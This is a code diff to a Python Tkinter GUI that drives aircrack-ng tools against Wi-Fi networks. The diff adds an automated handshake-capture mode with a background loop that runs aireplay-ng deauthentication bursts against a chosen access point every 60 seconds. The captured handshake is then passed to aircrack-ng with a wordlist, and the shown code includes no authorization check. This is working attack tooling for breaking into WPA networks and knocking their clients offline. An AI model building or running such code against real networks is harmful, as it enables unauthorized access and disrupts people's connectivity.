@@ -20,11 +20,18 @@ class DesktopApp(tk.Tk):
         super().__init__()
         self.title(APP_TITLE)
         self.geometry("900x520")
-        # scanning process state
+        # scanning / capturing state
         self.scanning = False
         self.scan_proc = None
         self.scan_tmpdir = None
         self.scan_prefix = None
+
+        self.capturing = False
+        self.capture_proc = None
+        self.capture_tmpdir = None
+        self.capture_prefix = None
+        self.stop_capture_event = threading.Event()
+        self.deauth_thread = None
 
         self._build_ui()
 
@@ -52,7 +59,7 @@ class DesktopApp(tk.Tk):
         self.scan_btn = ttk.Button(btn_frame, text="Start Scan", command=self.start_scan)
         self.scan_btn.pack(side=tk.LEFT, fill=tk.X, expand=True)
 
-        self.capture_btn = ttk.Button(btn_frame, text="Capture Handshake", command=self.start_capture)
+        self.capture_btn = ttk.Button(btn_frame, text="Capture Handshake", command=self.toggle_capture)
         self.capture_btn.pack(side=tk.LEFT, fill=tk.X, expand=True)
 
         self.crack_btn = ttk.Button(left, text="Crack (simulate)", command=self.start_crack)
@@ -98,8 +105,8 @@ class DesktopApp(tk.Tk):
         self.args_entry = ttk.Entry(cmd_frame)
         self.args_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(6,0))
 
-        run_btn = ttk.Button(left, text="Run", command=self.run_selected_command)
-        run_btn.pack(fill=tk.X, pady=(6,0))
+        self.run_btn = ttk.Button(left, text="Run", command=self.run_selected_command)
+        self.run_btn.pack(fill=tk.X, pady=(6,0))
 
         right = ttk.Frame(self)
         right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=8, pady=8)
@@ -245,8 +252,10 @@ class DesktopApp(tk.Tk):
             # stop
             self._stop_airodump_scan()
 
+    # (scan functions unchanged - omitted here for brevity in this view)
+    # For the canvas version we keep the original scan functions below
+
     def _start_airodump_scan(self):
-        """Start airodump-ng in CSV output mode and parse CSV periodically to populate the network list."""
         iface = self.iface_var.get().strip()
         if not iface:
             self.log("No interface selected for scan")
@@ -255,12 +264,9 @@ class DesktopApp(tk.Tk):
         airodump_exe = shutil.which("airodump-ng")
         if not airodump_exe:
             self.log("airodump-ng not available; falling back to quick scan (iw/iwlist)")
-            # fallback to old scan method
-            # reuse existing scan code path
             self._scan()
             return
 
-        # prepare temp dir and prefix
         tmp = tempfile.mkdtemp(prefix="airodump_")
         prefix = os.path.join(tmp, "dump")
         self.scan_tmpdir = tmp
@@ -277,12 +283,10 @@ class DesktopApp(tk.Tk):
         self.scan_proc = proc
         self.scanning = True
 
-        # Update button text
         def set_btn_stop():
             self.scan_btn.config(text="Stop Scan")
         self.after(0, set_btn_stop)
 
-        # Start a thread to read stderr/stdout
         def drain_streams(p):
             try:
                 for line in iter(p.stdout.readline, ""):
@@ -305,14 +309,12 @@ class DesktopApp(tk.Tk):
         t.daemon = True
         t.start()
 
-        # Periodically parse CSV
         try:
             while self.scanning and proc.poll() is None:
                 csv_path = prefix + "-01.csv"
                 if os.path.exists(csv_path):
                     try:
                         nets = self._parse_airodump_csv(csv_path)
-                        # update UI
                         def update_list():
                             self.net_listbox.delete(0, tk.END)
                             for n in nets:
@@ -332,7 +334,6 @@ class DesktopApp(tk.Tk):
                 time.sleep(1.0)
 
         finally:
-            # ensure we stop and clean up
             if proc and proc.poll() is None:
                 try:
                     proc.terminate()
@@ -346,7 +347,6 @@ class DesktopApp(tk.Tk):
             self.log("Airodump scan stopped")
 
     def _stop_airodump_scan(self):
-        """Stop a running airodump-ng scan if active."""
         if not self.scanning and not self.scan_proc:
             self.log("No active scan to stop")
             return
@@ -360,10 +360,6 @@ class DesktopApp(tk.Tk):
         self.scan_proc = None
 
     def _parse_airodump_csv(self, csv_path: str):
-        """Parse airodump-ng CSV file and return a list of networks.
-
-        Each entry is a dict: {'bssid','essid','channel','power'}
-        """
         rows = []
         try:
             with open(csv_path, newline='', encoding='utf-8', errors='ignore') as f:
@@ -372,7 +368,6 @@ class DesktopApp(tk.Tk):
         except Exception as e:
             raise
 
-        # find header row for networks (contains 'BSSID')
         header_idx = None
         header = None
         for i, r in enumerate(rows):
@@ -394,9 +389,7 @@ class DesktopApp(tk.Tk):
             if not (r[0] or '').strip():
                 break
 
-            # ensure length
             if len(r) < len(header):
-                # pad
                 r = r + [''] * (len(header) - len(r))
 
             idx = {h: idx for idx, h in enumerate(header)}
@@ -418,7 +411,6 @@ class DesktopApp(tk.Tk):
         return networks
 
     def _scan(self):
-        """Fallback quick scan using iw/iwlist or simulated results."""
         self.log("Starting quick scan...")
         iface = self.iface_var.get().strip()
         if not iface:
@@ -515,22 +507,64 @@ class DesktopApp(tk.Tk):
 
         self.after(0, update)
 
-    def start_capture(self):
-        sel = self.net_listbox.curselection()
-        if not sel:
-            messagebox.showinfo("No network selected", "Please select a network to capture handshake from.")
+    # --- Capture logic (updated) ---
+    def toggle_capture(self):
+        if not self.capturing:
+            sel = self.net_listbox.curselection()
+            if not sel:
+                messagebox.showinfo("No network selected", "Please select a network to capture handshake from.")
+                return
+            t = threading.Thread(target=self._capture, args=(sel[0],))
+            t.daemon = True
+            t.start()
+        else:
+            # stop capture requested by user
+            self._stop_capture()
+
+    def _set_capture_mode(self, enabled: bool):
+        # Disable/enable UI elements while capturing
+        widgets = [self.scan_btn, self.crack_btn, self.run_btn, self.iface_refresh_btn]
+        for w in widgets:
+            try:
+                if enabled:
+                    w.state(['disabled'])
+                else:
+                    w.state(['!disabled'])
+            except Exception:
+                try:
+                    w.config(state=tk.DISABLED if enabled else tk.NORMAL)
+                except Exception:
+                    pass
+        # update capture button text
+        self.capture_btn.config(text="Stop Capture" if enabled else "Capture Handshake")
+
+    def _stop_capture(self):
+        if not self.capturing:
             return
-        t = threading.Thread(target=self._capture, args=(sel[0],))
-        t.daemon = True
-        t.start()
+        self.log("Stopping capture (user requested)...")
+        self.stop_capture_event.set()
+        # terminate airodump process
+        try:
+            if self.capture_proc and self.capture_proc.poll() is None:
+                self.capture_proc.send_signal(subprocess.signal.SIGINT)
+        except Exception:
+            try:
+                if self.capture_proc and self.capture_proc.poll() is None:
+                    self.capture_proc.terminate()
+            except Exception:
+                pass
+        # wait a moment for threads to exit
+        time.sleep(0.2)
 
     def _capture(self, index):
         import signal
 
-        self.capture_btn.config(state=tk.DISABLED)
-        self.log("Starting handshake capture...")
+        # mark start
+        self.capturing = True
+        self.stop_capture_event.clear()
+        self._set_capture_mode(True)
+        self.log("Starting handshake capture (temporary files used; you will choose where to save after handshake)...")
 
-        # Lấy thông tin từ listbox (đã có CH hiển thị trong entry)
         try:
             entry = self.net_listbox.get(index)
         except Exception:
@@ -541,7 +575,6 @@ class DesktopApp(tk.Tk):
         bssid = None
         channel = None
 
-        # cố gắng parse BSSID và CH từ string hiển thị
         for p in parts:
             m = re.search(r"([0-9A-Fa-f:]{17})", p)
             if m and not bssid:
@@ -552,16 +585,18 @@ class DesktopApp(tk.Tk):
 
         if not bssid:
             self.log("Cannot determine BSSID from selection")
-            self.capture_btn.config(state=tk.NORMAL)
+            self._set_capture_mode(False)
+            self.capturing = False
             return
 
         if not channel:
-            channel = "6"  # fallback
+            channel = "6"
 
         iface = self.iface_var.get().strip()
         if not iface:
             self.log("No interface selected")
-            self.capture_btn.config(state=tk.NORMAL)
+            self._set_capture_mode(False)
+            self.capturing = False
             return
 
         # Ensure monitor mode is enabled (we won't assume name changes)
@@ -571,11 +606,9 @@ class DesktopApp(tk.Tk):
         except Exception as e:
             self.log(f"airmon-ng start warning: {e}")
 
-        # Determine which interface to use: prefer iface+'mon' if exists, else iface itself
         monitor_iface = iface
         try:
             iwcfg = subprocess.check_output(["iwconfig"], text=True, stderr=subprocess.DEVNULL)
-            # if iface+'mon' present in iwconfig output, use it
             if (iface + "mon") in iwcfg:
                 monitor_iface = iface + "mon"
         except Exception:
@@ -583,32 +616,49 @@ class DesktopApp(tk.Tk):
 
         self.log(f"Monitor interface: {monitor_iface}")
 
-        # Ask user for base path (airodump will append -01.cap)
-        default_name = f"handshake_{ssid.replace(' ', '_')}"
-        path_base = filedialog.asksaveasfilename(
-            title="Save handshake as (base name; airodump will append -01.cap)",
-            defaultextension=".cap",
-            initialfile=default_name,
-            filetypes=[("Capture files", "*.cap"), ("All files", "*.*")]
-        )
-        if not path_base:
-            self.log("Handshake capture cancelled by user")
-            self.capture_btn.config(state=tk.NORMAL)
-            return
+        # prepare temporary capture prefix
+        tmp = tempfile.mkdtemp(prefix="capture_")
+        prefix = os.path.join(tmp, "dump")
+        self.capture_tmpdir = tmp
+        self.capture_prefix = prefix
 
-        cmd = ["sudo", "airodump-ng", "--bssid", bssid, "-c", str(channel), "-w", path_base, monitor_iface]
+        cmd = ["sudo", "airodump-ng", "--bssid", bssid, "-c", str(channel), "-w", prefix, monitor_iface]
         self.log(f"Running: {' '.join(cmd)}")
 
         try:
             proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
         except Exception as e:
             self.log(f"Failed to start airodump-ng: {e}")
-            self.capture_btn.config(state=tk.NORMAL)
+            self._set_capture_mode(False)
+            self.capturing = False
             return
 
+        self.capture_proc = proc
         handshake_found = False
         start_time = time.time()
-        timeout = 180  # seconds, tăng nếu cần
+        timeout = 180  # seconds
+
+        # start deauth thread (send deauth bursts every 60s)
+        def deauth_loop():
+            aireplay = shutil.which('aireplay-ng')
+            if not aireplay:
+                self.log('aireplay-ng not found; deauth disabled')
+                return
+            while not self.stop_capture_event.is_set() and not handshake_found:
+                try:
+                    # send a short burst of deauths (5 packets)
+                    self.log(f"Sending deauth burst to {bssid} on {monitor_iface}...")
+                    subprocess.run(["sudo", aireplay, "--deauth", "5", "-a", bssid, monitor_iface], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
+                except Exception as e:
+                    self.log(f"Deauth attempt failed: {e}")
+                # wait up to 60s, but break early if stop requested
+                for _ in range(60):
+                    if self.stop_capture_event.is_set() or handshake_found:
+                        break
+                    time.sleep(1)
+
+        self.deauth_thread = threading.Thread(target=deauth_loop, daemon=True)
+        self.deauth_thread.start()
 
         def stream_reader(pipe, name):
             nonlocal handshake_found
@@ -622,7 +672,6 @@ class DesktopApp(tk.Tk):
                     if "wpa handshake" in low:
                         handshake_found = True
                         self.after(0, lambda: self.log("Handshake detected in airodump output"))
-                        # signal to break reading loops
                         try:
                             proc.send_signal(signal.SIGINT)
                         except Exception:
@@ -630,6 +679,9 @@ class DesktopApp(tk.Tk):
                                 proc.terminate()
                             except:
                                 pass
+                        break
+                    # allow stop request to interrupt
+                    if self.stop_capture_event.is_set():
                         break
             except Exception:
                 pass
@@ -643,12 +695,13 @@ class DesktopApp(tk.Tk):
         t_err = threading.Thread(target=stream_reader, args=(proc.stderr, "ERR"), daemon=True)
         t_out.start(); t_err.start()
 
-        # Wait until handshake or timeout
+        # Wait loop
         while True:
             if handshake_found:
                 break
             if proc.poll() is not None:
-                # process exited
+                break
+            if self.stop_capture_event.is_set():
                 break
             if time.time() - start_time > timeout:
                 self.after(0, lambda: self.log(f"No handshake after {timeout}s, stopping capture"))
@@ -671,15 +724,35 @@ class DesktopApp(tk.Tk):
             except:
                 pass
 
-        # determine cap file
-        captured_file = f"{path_base}-01.cap"
+        captured_file = f"{prefix}-01.cap"
+
         if os.path.exists(captured_file) and handshake_found:
-            self.last_capture_path = captured_file
-            self.log(f"✅ Handshake capture saved to: {captured_file} (channel {channel})")
+            # ask user where to save the final capture now
+            def ask_and_move():
+                default_name = f"handshake_{ssid.replace(' ', '_')}.cap"
+                path = filedialog.asksaveasfilename(
+                    title="Save handshake capture (final .cap)",
+                    defaultextension=".cap",
+                    initialfile=default_name,
+                    filetypes=[("Capture files", "*.cap"), ("All files", "*.*")]
+                )
+                if not path:
+                    self.log("User cancelled saving capture; temporary file left in: %s" % captured_file)
+                    self.last_capture_path = captured_file
+                    return
+                try:
+                    shutil.move(captured_file, path)
+                    self.last_capture_path = path
+                    self.log(f"✅ Handshake capture saved to: {path} (channel {channel})")
+                except Exception as e:
+                    self.log(f"Failed to move capture file: {e}")
+                    self.last_capture_path = captured_file
+            self.after(0, ask_and_move)
         else:
-            # file may exist but no handshake
             if os.path.exists(captured_file):
                 self.log(f"Capture file {captured_file} exists but no handshake was found")
+                # optionally keep the file for later inspection
+                self.last_capture_path = captured_file
             else:
                 self.log("Capture file not found; no handshake captured")
 
@@ -689,9 +762,15 @@ class DesktopApp(tk.Tk):
         except Exception:
             pass
 
-        self.capture_btn.config(state=tk.NORMAL)
+        # stop deauth thread
+        self.stop_capture_event.set()
+        # small wait for background threads
+        time.sleep(0.2)
 
-
+        # reset state & UI
+        self.capturing = False
+        self.capture_proc = None
+        self._set_capture_mode(False)
 
     def start_crack(self):
         sel = self.net_listbox.curselection()
@@ -716,7 +795,6 @@ class DesktopApp(tk.Tk):
             self.log("aircrack-ng found, running real command (will prompt for .cap and wordlist if needed)")
             self.log(f"aircrack-ng path: {proc}")
 
-            # Ensure we have a capture file
             cap = self.last_capture_path
             if not cap or not os.path.exists(cap):
                 cap = filedialog.askopenfilename(title="Select capture file (.cap)", filetypes=[("Capture files", "*.cap"), ("All files", "*.*")])
@@ -725,7 +803,6 @@ class DesktopApp(tk.Tk):
                     self.crack_btn.config(state=tk.NORMAL)
                     return
 
-            # Ensure we have a wordlist
             wordlist = self.wordlist_var.get().strip()
             if not wordlist or not os.path.exists(wordlist):
                 wordlist = filedialog.askopenfilename(title="Select wordlist file", filetypes=[("Wordlist", "*.*")])
@@ -734,7 +811,6 @@ class DesktopApp(tk.Tk):
                     self.crack_btn.config(state=tk.NORMAL)
                     return
 
-            # Run aircrack-ng -w <wordlist> <capture>
             try:
                 exe = proc
                 self.log(f"Running: {exe} -w {wordlist} {cap}")
@@ -757,13 +833,11 @@ class DesktopApp(tk.Tk):
                 self.log(f"Failed to run aircrack-ng: {e}")
             time.sleep(0.2)
         else:
-            # simulated cracking progress
             steps = 6
             for i in range(steps):
                 time.sleep(0.9)
                 self.log(f"Cracking... {int((i+1)/steps*100)}%")
 
-            # random outcome
             if random.random() < 0.35:
                 key = "correcthorsebatterystaple"
                 self.log(f"Key found: {key}")
